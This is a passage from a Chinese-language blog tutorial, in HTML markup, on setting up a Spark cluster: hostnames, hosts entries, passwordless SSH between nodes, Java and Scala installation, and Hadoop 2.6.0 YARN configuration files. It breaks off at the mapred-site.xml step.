&lt;/blockquote&gt;
&lt;h2 id=&quot;0-写在前面&quot;&gt;&lt;a href=&quot;#0-写在前面&quot; class=&quot;headerlink&quot; title=&quot;0 写在前面&quot;&gt;&lt;/a&gt;0 写在前面&lt;/h2&gt;&lt;p&gt;本例中的演示均为非 root 权限，所以有些命令行需要加 sudo，如果你是 root 身份运行，请忽略 sudo。下载安装的软件建议都放在 home 目录之上，比如&lt;code&gt;~/workspace&lt;/code&gt;中，这样比较方便，以免权限问题带来不必要的麻烦。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;1-环境准备&quot;&gt;&lt;a href=&quot;#1-环境准备&quot; class=&quot;headerlink&quot; title=&quot;1. 环境准备&quot;&gt;&lt;/a&gt;1. 环境准备&lt;/h2&gt;&lt;h3 id=&quot;修改主机名&quot;&gt;&lt;a href=&quot;#修改主机名&quot; class=&quot;headerlink&quot; title=&quot;修改主机名&quot;&gt;&lt;/a&gt;修改主机名&lt;/h3&gt;&lt;p&gt;我们将搭建1个master，2个slave的集群方案。首先修改主机名&lt;code&gt;vi /etc/hostname&lt;/code&gt;，在master上修改为&lt;code&gt;master&lt;/code&gt;，其中一个slave上修改为&lt;code&gt;slave1&lt;/code&gt;，另一个同理。&lt;/p&gt;
&lt;h3 id=&quot;配置hosts&quot;&gt;&lt;a href=&quot;#配置hosts&quot; class=&quot;headerlink&quot; title=&quot;配置hosts&quot;&gt;&lt;/a&gt;配置hosts&lt;/h3&gt;&lt;p&gt;在每台主机上修改host文件&lt;br&gt;&lt;figure class=&quot;highlight nginx&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attribute&quot;&gt;vi&lt;/span&gt; /etc/hosts&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;10.1.1.107&lt;/span&gt;      master&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;10.1.1.108&lt;/span&gt;      slave1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;10.1.1.109&lt;/span&gt;      slave2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;配置之后ping一下用户名看是否生效&lt;br&gt;&lt;figure class=&quot;highlight autoit&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;ping&lt;/span&gt; slave1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;ping&lt;/span&gt; slave2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;SSH-免密码登录&quot;&gt;&lt;a href=&quot;#SSH-免密码登录&quot; class=&quot;headerlink&quot; title=&quot;SSH 免密码登录&quot;&gt;&lt;/a&gt;SSH 免密码登录&lt;/h3&gt;&lt;p&gt;安装Openssh server&lt;br&gt;&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get &lt;span class=&quot;keyword&quot;&gt;install&lt;/span&gt; openssh-&lt;span class=&quot;keyword&quot;&gt;server&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;在所有机器上都生成私钥和公钥&lt;br&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ssh-keygen -t rsa   &lt;span class=&quot;comment&quot;&gt;#一路回车&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;需要让机器间都能相互访问，就把每个机子上的&lt;code&gt;id_rsa.pub&lt;/code&gt;发给master节点，传输公钥可以用scp来传输。&lt;br&gt;&lt;figure class=&quot;highlight stylus&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;scp ~/.ssh/id_rsa&lt;span class=&quot;selector-class&quot;&gt;.pub&lt;/span&gt; spark@master:~/.ssh/id_rsa&lt;span class=&quot;selector-class&quot;&gt;.pub&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.slave1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;在master上，将所有公钥加到用于认证的公钥文件&lt;code&gt;authorized_keys&lt;/code&gt;中&lt;br&gt;&lt;figure class=&quot;highlight ruby&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cat ~&lt;span class=&quot;regexp&quot;&gt;/.ssh/id&lt;/span&gt;_rsa.pub* &lt;span class=&quot;meta&quot;&gt;&amp;gt;&amp;gt; &lt;/span&gt;~&lt;span class=&quot;regexp&quot;&gt;/.ssh/authorized&lt;/span&gt;_keys&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;将公钥文件&lt;code&gt;authorized_keys&lt;/code&gt;分发给每台slave&lt;br&gt;&lt;figure class=&quot;highlight elixir&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;scp ~&lt;span class=&quot;regexp&quot;&gt;/.ssh/authorized&lt;/span&gt;_keys spark&lt;span class=&quot;variable&quot;&gt;@slave1&lt;/span&gt;&lt;span class=&quot;symbol&quot;&gt;:~/&lt;/span&gt;.ssh/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;在每台机子上验证SSH无密码通信&lt;br&gt;&lt;figure class=&quot;highlight crmsh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ssh &lt;span class=&quot;keyword&quot;&gt;master&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;ssh&lt;/span&gt; slave1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ssh slave2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;如果登陆测试不成功，则可能需要修改文件authorized_keys的权限（权限的设置非常重要，因为不安全的设置安全设置,会让你不能使用RSA功能 ）&lt;br&gt;&lt;figure class=&quot;highlight crystal&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;chmod &lt;span class=&quot;number&quot;&gt;600&lt;/span&gt; ~&lt;span class=&quot;regexp&quot;&gt;/.ssh/authorized&lt;/span&gt;_keys&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;安装-Java&quot;&gt;&lt;a href=&quot;#安装-Java&quot; class=&quot;headerlink&quot; title=&quot;安装 Java&quot;&gt;&lt;/a&gt;安装 Java&lt;/h2&gt;&lt;p&gt;从&lt;a href=&quot;http://www.oracle.com/technetwork/java/javase/overview/index.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;官网&lt;/a&gt;下载最新版 Java 就可以，Spark官方说明 Java 只要是6以上的版本都可以，我下的是 jdk-7u75-linux-x64.gz&lt;br&gt;在&lt;code&gt;~/workspace&lt;/code&gt;目录下直接解压&lt;br&gt;&lt;figure class=&quot;highlight css&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-tag&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;-zxvf&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;jdk-7u75-linux-x64&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.gz&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;修改环境变量&lt;code&gt;sudo vi /etc/profile&lt;/code&gt;，添加下列内容，&lt;strong&gt;注意将home路径替换成你的&lt;/strong&gt;：&lt;br&gt;&lt;figure class=&quot;highlight xquery&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;export WORK_SPACE=/home/spark/workspace/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;export JAVA_HOME=$WORK_SPACE/jdk1.&lt;span class=&quot;number&quot;&gt;7.0_75&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;export JRE_HOME=/home/spark/work/jdk1.&lt;span class=&quot;number&quot;&gt;7.0_75&lt;/span&gt;/jre&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;export PATH=$JAVA_HOME/bin:$JAVA_HOME/jre/bin:$PATH&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;export CLASSPATH=$CLASSPATH:.:$JAVA_HOME/lib:$JAVA_HOME/jre/lib&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;然后使环境变量生效，并验证 Java 是否安装成功&lt;br&gt;&lt;figure class=&quot;highlight armasm&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ source /etc/profile   #生效环境变量&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ java -version         #如果打印出如下版本信息，则说明安装成功&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;symbol&quot;&gt;java&lt;/span&gt; version &lt;span class=&quot;string&quot;&gt;&quot;1.7.0_75&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;symbol&quot;&gt;Java&lt;/span&gt;(TM) SE Runtime Environment (&lt;span class=&quot;keyword&quot;&gt;build &lt;/span&gt;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;_75-&lt;span class=&quot;keyword&quot;&gt;b13)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;span class=&quot;symbol&quot;&gt;Java&lt;/span&gt; HotSpot(TM) &lt;span class=&quot;number&quot;&gt;64&lt;/span&gt;-&lt;span class=&quot;keyword&quot;&gt;Bit &lt;/span&gt;Server VM (&lt;span class=&quot;keyword&quot;&gt;build &lt;/span&gt;&lt;span class=&quot;number&quot;&gt;24&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;75&lt;/span&gt;-&lt;span class=&quot;keyword&quot;&gt;b04, &lt;/span&gt;mixed mode)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;安装-Scala&quot;&gt;&lt;a href=&quot;#安装-Scala&quot; class=&quot;headerlink&quot; title=&quot;安装 Scala&quot;&gt;&lt;/a&gt;安装 Scala&lt;/h2&gt;&lt;p&gt;Spark官方要求 Scala 版本为 2.10.x，注意不要下错版本，我这里下了 2.10.4，&lt;a href=&quot;http://www.scala-lang.org/download/2.10.4.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;官方下载地址&lt;/a&gt;（可恶的天朝大局域网下载 Scala 龟速一般）。&lt;/p&gt;
&lt;p&gt;同样我们在&lt;code&gt;~/workspace&lt;/code&gt;中解压&lt;br&gt;&lt;figure class=&quot;highlight css&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-tag&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;-zxvf&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;scala-2&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.10&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.4&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.tgz&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;再次修改环境变量&lt;code&gt;sudo vi /etc/profile&lt;/code&gt;，添加以下内容：&lt;br&gt;&lt;figure class=&quot;highlight xquery&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;export SCALA_HOME=$WORK_SPACE/scala-&lt;span class=&quot;number&quot;&gt;2.10&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;export PATH=$PATH:$SCALA_HOME/bin&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;同样的方法使环境变量生效，并验证 scala 是否安装成功&lt;br&gt;&lt;figure class=&quot;highlight applescript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ source /etc/profile   &lt;span class=&quot;comment&quot;&gt;#生效环境变量&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ scala -&lt;span class=&quot;built_in&quot;&gt;version&lt;/span&gt;        &lt;span class=&quot;comment&quot;&gt;#如果打印出如下版本信息，则说明安装成功&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Scala code runner &lt;span class=&quot;built_in&quot;&gt;version&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2.10&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.4&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;-- Copyright 2002-2013, LAMP/EPFL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;安装配置-Hadoop-YARN&quot;&gt;&lt;a href=&quot;#安装配置-Hadoop-YARN&quot; class=&quot;headerlink&quot; title=&quot;安装配置 Hadoop YARN&quot;&gt;&lt;/a&gt;安装配置 Hadoop YARN&lt;/h2&gt;&lt;h3 id=&quot;下载解压&quot;&gt;&lt;a href=&quot;#下载解压&quot; class=&quot;headerlink&quot; title=&quot;下载解压&quot;&gt;&lt;/a&gt;下载解压&lt;/h3&gt;&lt;p&gt;从&lt;a href=&quot;http://hadoop.apache.org/releases.html#Download&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;官网&lt;/a&gt;下载 hadoop2.6.0 版本，这里给个我们学校的&lt;a href=&quot;http://mirror.bit.edu.cn/apache/hadoop/common/hadoop-2.6.0/hadoop-2.6.0.tar.gz&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;镜像下载地址&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;同样我们在&lt;code&gt;~/workspace&lt;/code&gt;中解压&lt;br&gt;&lt;figure class=&quot;highlight css&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-tag&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;-zxvf&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;hadoop-2&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.6&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.tar&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.gz&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;配置-Hadoop&quot;&gt;&lt;a href=&quot;#配置-Hadoop&quot; class=&quot;headerlink&quot; title=&quot;配置 Hadoop&quot;&gt;&lt;/a&gt;配置 Hadoop&lt;/h3&gt;&lt;p&gt;&lt;code&gt;cd ~/workspace/hadoop-2.6.0/etc/hadoop&lt;/code&gt;进入hadoop配置目录，需要配置有以下7个文件：&lt;code&gt;hadoop-env.sh&lt;/code&gt;，&lt;code&gt;yarn-env.sh&lt;/code&gt;，&lt;code&gt;slaves&lt;/code&gt;，&lt;code&gt;core-site.xml&lt;/code&gt;，&lt;code&gt;hdfs-site.xml&lt;/code&gt;，&lt;code&gt;maprd-site.xml&lt;/code&gt;，&lt;code&gt;yarn-site.xml&lt;/code&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;在&lt;code&gt;hadoop-env.sh&lt;/code&gt;中配置JAVA_HOME&lt;/p&gt;
&lt;figure class=&quot;highlight arduino&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;# The java implementation to use.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;export&lt;/span&gt; JAVA_HOME=/&lt;span class=&quot;built_in&quot;&gt;home&lt;/span&gt;/spark/workspace/jdk1&lt;span class=&quot;number&quot;&gt;.7&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.0&lt;/span&gt;_75&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;在&lt;code&gt;yarn-env.sh&lt;/code&gt;中配置JAVA_HOME&lt;/p&gt;
&lt;figure class=&quot;highlight arduino&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;# some Java parameters&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;export&lt;/span&gt; JAVA_HOME=/&lt;span class=&quot;built_in&quot;&gt;home&lt;/span&gt;/spark/workspace/jdk1&lt;span class=&quot;number&quot;&gt;.7&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.0&lt;/span&gt;_75&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;在&lt;code&gt;slaves&lt;/code&gt;中配置slave节点的ip或者host，&lt;/p&gt;
&lt;figure class=&quot;highlight nginx&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attribute&quot;&gt;slave1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;slave2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;修改&lt;code&gt;core-site.xml&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight dts&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;&amp;lt;configuration&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;params&quot;&gt;&amp;lt;property&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;params&quot;&gt;&amp;lt;name&amp;gt;&lt;/span&gt;fs.defaultFS&lt;span class=&quot;params&quot;&gt;&amp;lt;/name&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;params&quot;&gt;&amp;lt;value&amp;gt;&lt;/span&gt;hdfs:&lt;span class=&quot;comment&quot;&gt;//master:9000/&amp;lt;/value&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;params&quot;&gt;&amp;lt;/property&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;params&quot;&gt;&amp;lt;property&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;params&quot;&gt;&amp;lt;name&amp;gt;&lt;/span&gt;hadoop.tmp.dir&lt;span class=&quot;params&quot;&gt;&amp;lt;/name&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;params&quot;&gt;&amp;lt;value&amp;gt;&lt;/span&gt;file:&lt;span class=&quot;meta-keyword&quot;&gt;/home/&lt;/span&gt;spark&lt;span class=&quot;meta-keyword&quot;&gt;/workspace/&lt;/span&gt;hadoop&lt;span class=&quot;number&quot;&gt;-2.6&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.0&lt;/span&gt;/tmp&lt;span class=&quot;params&quot;&gt;&amp;lt;/value&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;params&quot;&gt;&amp;lt;/property&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;&amp;lt;/configuration&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;修改&lt;code&gt;hdfs-site.xml&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight dts&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;&amp;lt;configuration&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;params&quot;&gt;&amp;lt;property&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;params&quot;&gt;&amp;lt;name&amp;gt;&lt;/span&gt;dfs.namenode.secondary.http-address&lt;span class=&quot;params&quot;&gt;&amp;lt;/name&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;params&quot;&gt;&amp;lt;value&amp;gt;&lt;/span&gt;master:&lt;span class=&quot;number&quot;&gt;9001&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;&amp;lt;/value&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;params&quot;&gt;&amp;lt;/property&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;params&quot;&gt;&amp;lt;property&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;params&quot;&gt;&amp;lt;name&amp;gt;&lt;/span&gt;dfs.namenode.name.dir&lt;span class=&quot;params&quot;&gt;&amp;lt;/name&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;params&quot;&gt;&amp;lt;value&amp;gt;&lt;/span&gt;file:&lt;span class=&quot;meta-keyword&quot;&gt;/home/&lt;/span&gt;spark&lt;span class=&quot;meta-keyword&quot;&gt;/workspace/&lt;/span&gt;hadoop&lt;span class=&quot;number&quot;&gt;-2.6&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;meta-keyword&quot;&gt;/dfs/&lt;/span&gt;name&lt;span class=&quot;params&quot;&gt;&amp;lt;/value&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;params&quot;&gt;&amp;lt;/property&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;params&quot;&gt;&amp;lt;property&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;params&quot;&gt;&amp;lt;name&amp;gt;&lt;/span&gt;dfs.datanode.data.dir&lt;span class=&quot;params&quot;&gt;&amp;lt;/name&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;params&quot;&gt;&amp;lt;value&amp;gt;&lt;/span&gt;file:&lt;span class=&quot;meta-keyword&quot;&gt;/home/&lt;/span&gt;spark&lt;span class=&quot;meta-keyword&quot;&gt;/workspace/&lt;/span&gt;hadoop&lt;span class=&quot;number&quot;&gt;-2.6&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;meta-keyword&quot;&gt;/dfs/&lt;/span&gt;data&lt;span class=&quot;params&quot;&gt;&amp;lt;/value&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;params&quot;&gt;&amp;lt;/property&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;params&quot;&gt;&amp;lt;property&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;params&quot;&gt;&amp;lt;name&amp;gt;&lt;/span&gt;dfs.replication&lt;span class=&quot;params&quot;&gt;&amp;lt;/name&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;params&quot;&gt;&amp;lt;value&amp;gt;&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;&amp;lt;/value&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;params&quot;&gt;&amp;lt;/property&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;&amp;lt;/configuration&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;修改&lt;code&gt;mapred-site.xml&lt;/code&gt;&lt;/p&gt;
